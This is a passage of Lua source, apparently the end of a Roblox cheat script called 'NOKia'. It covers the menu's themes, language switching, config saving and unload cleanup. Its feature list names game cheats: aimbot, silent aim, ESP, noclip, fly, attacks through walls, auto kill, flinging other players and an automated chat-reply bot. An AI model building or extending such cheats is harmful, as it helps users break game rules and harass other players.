	end MiniBtn.Visible=false end)

local bindNote=Library:AddDraggableLabel("Menu Bind:  "..tostring(Options.MenuKeybind.Value))
bindNote:SetVisible(false)
local function updateBindNote() pcall(function() bindNote:SetText("Menu Bind:  "..tostring(Options.MenuKeybind.Value)) end) end
Options.MenuKeybind:OnChanged(function() updateBindNote() end)
MenuGroup:AddToggle("TouchPad",{Text="Touch Controls",Tooltip="On-screen buttons for fly up, fly down and aimbot hold. Auto-enabled on touch devices, since those have no Space, Ctrl or right click.",Default=false,Callback=function(v) flags.touchPad=v end})
MenuGroup:AddToggle("MiniSquare",{Text="Minimize To Square",Tooltip="Shows a small draggable square while the menu is hidden. Click it to reopen.",Default=true,Callback=function(v) flags.miniSquare=v end})
MenuGroup:AddToggle("ShowBindNote",{Text="Show Menu Bind Note",Tooltip="Draggable on-screen reminder of your menu keybind.",Default=false,Callback=function(v) flags.showBindNote=v; updateBindNote(); bindNote:SetVisible(v) end})

local function mainFrame() local sg=Library.ScreenGui; return sg and sg:FindFirstChild("Main") end
do
	local origToggle=Library.Toggle
	Library.Toggle=function(a,b)
		if Library.Unloaded then return origToggle(a,b) end
		local val; if type(a)=="boolean" then val=a elseif type(b)=="boolean" then val=b end
		local target=(val~=nil) and val or (not Library.Toggled)
		local mf=mainFrame(); local sc=mf and mf:FindFirstChildOfClass("UIScale")
		if not (mf and sc) then return origToggle(Library,target) end
		if target then
			origToggle(Library,true)
			local base=sc.Scale; sc.Scale=base*0.92
			pcall(function() TweenService:Create(sc,TweenInfo.new(0.2,Enum.EasingStyle.Back,Enum.EasingDirection.Out),{Scale=base}):Play() end)
		else
			local base=sc.Scale
			local tw=TweenService:Create(sc,TweenInfo.new(0.15,Enum.EasingStyle.Quad,Enum.EasingDirection.In),{Scale=base*0.9})
			tw.Completed:Once(function() origToggle(Library,false); sc.Scale=base end)
			tw:Play()
		end
	end
end
local sideBase=setmetatable({},{__mode="k"})
for _,tab in pairs(Tabs) do
	local origShow=tab.Show
	tab.Show=function(self,...)
		origShow(self,...)
		for _,side in ipairs(self.Sides or {}) do
			if sideBase[side]==nil then sideBase[side]=side.Position end
			local base=sideBase[side]
			pcall(function() side.Position=base+UDim2.fromOffset(0,12); TweenService:Create(side,TweenInfo.new(0.24,Enum.EasingStyle.Quint,Enum.EasingDirection.Out),{Position=base}):Play() end)
		end
	end
end
for _,opt in pairs(Options) do
	if opt.Type=="Dropdown" and opt.Menu and opt.Menu.Menu then
		local frame=opt.Menu.Menu
		bind(frame:GetPropertyChangedSignal("Visible"),function()
			if frame.Visible then local base=frame.Position
				pcall(function() frame.Position=base-UDim2.fromOffset(0,8); TweenService:Create(frame,TweenInfo.new(0.18,Enum.EasingStyle.Quint,Enum.EasingDirection.Out),{Position=base}):Play() end)
			end
		end)
	end
end

ThemeManager:SetLibrary(Library)
SaveManager:SetLibrary(Library)
SaveManager:IgnoreThemeSettings()
ThemeManager:SetFolder(CONFIG_FOLDER)
SaveManager:SetFolder(CONFIG_FOLDER.."/configs")

do
	local themeNames={}
	for name in pairs(ThemeManager.BuiltInThemes) do themeNames[#themeNames+1]=name end
	table.sort(themeNames,function(a,b)
		return ThemeManager.BuiltInThemes[a][1]<ThemeManager.BuiltInThemes[b][1]
	end)

	local g=Tabs.UI:AddRightGroupbox("Theme")
	g:AddDropdown("ThemePick",{Text="Theme",Values=themeNames,Default=1,AllowNull=false,
		Tooltip="Switches the whole colour scheme"})
	g:AddLabel("Accent colour"):AddColorPicker("AccentColor",{Default=Library.Scheme.AccentColor,
		Tooltip="The highlight colour used across the menu"})
	g:AddDropdown("UIStyle",{Text="Interface Style",Values={"Classic","iOS 26 Rounded","Material UI Extended","Soft Rounded","Capsule"},Default="Classic",AllowNull=false,
		Tooltip="Changes the menu shape instantly and saves your choice.",Callback=function(v)
			flags.uiStyle=v
			setMenuStyle(v)
		end})
	g:AddLabel("Applied and saved automatically.")

	Options.ThemePick:OnChanged(function()
		ThemeManager:ApplyTheme(Options.ThemePick.Value)
		pcall(function() ThemeManager:SaveDefault(Options.ThemePick.Value) end)
	end)
	Options.AccentColor:OnChanged(function()
		ThemeManager:ThemeUpdate()
	end)
end

do
	local g=Tabs.UI:AddRightGroupbox("Language")
	g:AddDropdown("Language",{Text="Language",Values={"English","Français"},Default="English",AllowNull=false,
		Tooltip="Changes the visible menu labels immediately and saves your preference.",Callback=function(value)
			NOKia.applyUiLanguage(value=="Français" and "French" or "English")
			-- Force the library to redraw key pickers after translating nearby labels.
			for _,keyName in ipairs({"FlyKey","NoclipKey","AimKey","MenuKeybind","FlingSheriffKey","FlingMurdererKey","OneShotRoleKillKey","KillExceptSheriffKey","CollectAllMapCoinsKey","SafetyModeKey"}) do
				local key=Options[keyName]
				if key and key.SetValue then
					pcall(function() key:SetValue({key.Value or "None",key.Mode or "Toggle",key.Modifiers or {}}) end)
				end
			end
		end})
	g:AddLabel("French translates the main menu labels. Your setting is saved automatically.")
end

do
	local g=Tabs.UI:AddRightGroupbox("Configs")
	g:AddInput("CfgName",{Text="Config Name",Default="",Finished=true,
		Tooltip="Name to save the current settings under"})
	g:AddDropdown("CfgList",{Text="Saved Configs",Values=SaveManager:RefreshConfigList(),
		AllowNull=true,Tooltip="Your saved setting profiles"})
	local function refreshCfgs()
		pcall(function() Options.CfgList:SetValues(SaveManager:RefreshConfigList()) end)
	end
	g:AddButton({Text="Save",Tooltip="Writes every toggle and slider to this config",Func=function()
		local n=Options.CfgName.Value
		if not n or #n==0 then notify("Type a config name first"); return end
		local ok,err=SaveManager:Save(n)
		notify(ok and ("Saved config: "..n) or ("Save failed: "..tostring(err)))
		refreshCfgs()
	end})
	g:AddButton({Text="Load",Tooltip="Applies the selected config",Func=function()
		local n=Options.CfgList.Value
		if not n or #tostring(n)==0 then notify("Pick a config first"); return end
		local ok,err=SaveManager:Load(n)
		notify(ok and ("Loaded config: "..tostring(n)) or ("Load failed: "..tostring(err)))
	end})
	g:AddButton({Text="Autoload Selected",Tooltip="Applies this config automatically on every launch",Func=function()
		local n=Options.CfgList.Value
		if not n or #tostring(n)==0 then notify("Pick a config first"); return end
		SaveManager:SaveAutoloadConfig(n)
		notify("Autoloading: "..tostring(n))
	end})
	g:AddButton({Text="Delete",Tooltip="Removes the selected config",Func=function()
		local n=Options.CfgList.Value
		if not n or #tostring(n)==0 then notify("Pick a config first"); return end
		SaveManager:Delete(n)
		notify("Deleted config: "..tostring(n))
		refreshCfgs()
	end})
end

pcall(function()
	local name,ok=ThemeManager:GetDefaultTheme()
	if not (ok and ThemeManager.BuiltInThemes[name]) then
		name="NOKia Soft Midnight"
		ThemeManager:SaveDefault(name)
	end
	Options.ThemePick:SetValue(name)
end)
pcall(function() SaveManager:LoadAutoloadConfig() end)

-- Keep one private profile up to date, so the menu comes back exactly as it was.
do
	local loaded=false
	pcall(function() loaded=SaveManager:Load(AUTO_SAVE_CONFIG) end)
	task.wait() -- SaveManager applies loaded controls on the next scheduler step.
	NOKia.networkArmed=true
	if not loaded then pcall(function() SaveManager:Save(AUTO_SAVE_CONFIG) end) end

	local pending=false
	NOKia.toastAt={}
	NOKia.controlNames={
		AutoKill="Auto Kill",Fly="Fly",Noclip="Noclip",InfJump="Infinite Jump",AutoCoins="Auto Collect Coins",AutoCoinAvoidWalls="Smart Walking Mode",CoinTeleportWhenStuck="Teleport If Completely Stuck",CoinTeleportWhenDanger="Emergency Teleport From Murderer",CoinPath="Show 10-Coin Route",CollectAllMapCoinsKey="Collect All Map Coins Key",
		MurdererSheriffBot="Auto Kill Sheriff",SheriffMurdererBot="Auto Kill Murderer",KillRemainingAfterSheriff="Kill Remaining Players",CoinBagBeforeRoleBot="Auto Collect Until Bag Full",
		CoinLimitBeforeRoleBot="Use Specific Coin Limit",KnifeWalls="Knife Through Walls",GunWalls="Gun Through Walls",Aimbot="Aimbot",SilentAim="Knife Silent Aim",
		EspNames="Nametag ESP",EspBox="Box ESP",EspChams="Chams",CoinEsp="Coin ESP",Fullbright="Fullbright",FpsBoost="FPS Boost",AntiFling="Anti Fling",PauseAntiFlingDuringFling="Pause Anti Fling During Fling",AntiAfk="Anti-AFK",AutoFlingSelected="Auto Fling Selected Player",UltraFling="Ultra Fling — EXPERIMENTAL",NokiaNetwork="Activer Nokia Online Services",AutoMistralChat="Reply When Mentioned",MistralReplyAll="EXPERIMENTAL — Reply To Every Message",MistralModel="Mistral Model",MistralPersona="Chat Personality",
		GuiHud="Show Custom HUD",GuiEditMode="Edit Mode",Language="Language",UIStyle="Interface Style",ThemePick="Theme",FlyKey="Fly Key",NoclipKey="Noclip Key",AimKey="Aimbot Key",MenuKeybind="Menu Key",FlingSheriffKey="Fling Sheriff Key",FlingMurdererKey="Fling Murderer Key",OneShotRoleKillKey="One-Shot Role Attack Key",KillExceptSheriffKey="Kill Everyone Except Sheriff Key",CollectAllMapCoinsKey="Collect All Map Coins Key",SafetyModeKey="Safety Mode Key",
	}
	local function saveCurrentSettings()
		if pending then return end
		pending=true
		task.delay(0.6,function()
			pending=false
			pcall(function() SaveManager:Save(AUTO_SAVE_CONFIG) end)
		end)
	end
	local function addAutoSave(index,element)
		local previous=element.Changed
		element:OnChanged(function(...)
			if type(previous)=="function" then previous(...) end
			saveCurrentSettings()
			local now=os.clock()
			if now-(NOKia.toastAt[index] or 0)<.25 then return end
			NOKia.toastAt[index]=now
			local value=element.Value
			if value==nil then value=select(1,...) end
			local name=NOKia.controlNames[index] or tostring(index)
			if NOKia.uiLanguage=="French" then name=NOKia.frenchText[name] or name end
			if type(value)=="boolean" then
				NOKia.showActionToast(name.." : "..(value and (NOKia.uiLanguage=="French" and "activé" or "enabled") or (NOKia.uiLanguage=="French" and "désactivé" or "disabled")))
			elseif type(value)=="table" then
				NOKia.showActionToast(name.." : "..tostring(value[1] or "changed"))
			else
				NOKia.showActionToast(name.." : "..tostring(value))
			end
		end)
	end
	for index,toggle in pairs(Toggles) do
		pcall(function() addAutoSave(index,toggle) end)
	end
	for index,option in pairs(Options) do
		if index~="CfgName" and index~="CfgList" then
			pcall(function() addAutoSave(index,option) end)
		end
	end
	Library:OnUnload(function()
		pcall(function() SaveManager:Save(AUTO_SAVE_CONFIG) end)
	end)
end

Library:OnUnload(function()
	pcall(function() if GENV then GENV.NOKia_Unload=nil; GENV.NOKia_GUIS=nil end end)
	for k,v in pairs(flags) do if type(v)=="boolean" then flags[k]=false end end
	stopFly(); setFullbright(false); setFPSBoost(false)
	setCamThruWalls(false); setUnlockCam(false)
	pcall(function() Camera.FieldOfView=70 end)
	local h=LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	if h then pcall(function() h.PlatformStand=false;h.WalkSpeed=16;h.UseJumpPower=true;h.JumpPower=50 end) end
	pcall(function() if murdNotif then murdNotif:Destroy() end end)
	for _,line in ipairs(NOKia.coinPathLines or {}) do pcall(function() line:Remove() end) end
	for p in pairs(espStore) do clearEsp(p) end
	for p in pairs(skelStore) do clearSkel(p) end
	for p in pairs(boxStore) do clearBox(p) end
	for c,hl in pairs(coinEspStore) do hl:Destroy() end
	for _,c in ipairs(conns) do pcall(function() c:Disconnect() end) end
	pcall(function()
		for p in pairs(NOKia.unclip) do if p.Parent then p.CanCollide=true end end
		table.clear(NOKia.unclip)
		if h then h:ChangeState(Enum.HumanoidStateType.GettingUp) end
	end)
	pcall(function()
		for _,d in ipairs(NOKia.antiFlingParts or {}) do
			if d and d.Parent and d:IsA("BasePart") then d.CanCollide=true end
		end
	end)
	pcall(function() EspGui:Destroy() end)
	pcall(function() MiniGui:Destroy() end)
	pcall(function()
		for _,g in ipairs(TRACKED) do pcall(function() g:Destroy() end) end
		table.clear(TRACKED)
	end)
end)
do
	local saved=false
	pcall(function()
		local p=CONFIG_FOLDER.."/themes/default.txt"
		if typeof(isfile)=="function" and isfile(p) then
			local name=readfile(p)
			saved=(name~=nil and #name>0)
		end
	end)
	if not saved then
		local scheme={
			BackgroundColor=Color3.fromRGB(10,10,10),
			MainColor=Color3.fromRGB(20,20,20),
			AccentColor=Color3.fromRGB(230,230,230),
			OutlineColor=Color3.fromRGB(58,58,58),
			FontColor=Color3.fromRGB(255,255,255),
		}
		for k,v in pairs(scheme) do
			pcall(function() Library.Scheme[k]=v end)
		end
		pcall(function() Library:UpdateColorsUsingRegistry() end)
		pcall(function() Options.AccentColor:SetValueRGB(scheme.AccentColor) end)
	end
end
pcall(function() if GENV then GENV.NOKia_Unload=function() pcall(function() Library:Unload() end) end end end)
